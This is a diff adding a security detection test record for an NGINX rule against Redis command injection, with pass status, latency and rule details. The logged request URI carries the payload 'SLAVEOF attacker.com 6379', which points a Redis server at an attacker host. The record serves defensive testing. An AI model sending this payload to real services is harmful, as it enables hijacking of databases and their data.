@@ -1,0 +1,5 @@
+Pattern ID: NOSQL_REDIS_003
+        Status: passed
+        Latency: ~61000ms
+        Detection: 1 / 1
+        Rule: [NGINX Emerging Threat] Redis command injection test_id=NOSQL_REDIS_003-1772277058430-2q77i5 pattern_id=NOSQL_REDIS_003 uri=/?q=SLAVEOF%20attacker.com%206379 client=127.0.0.1
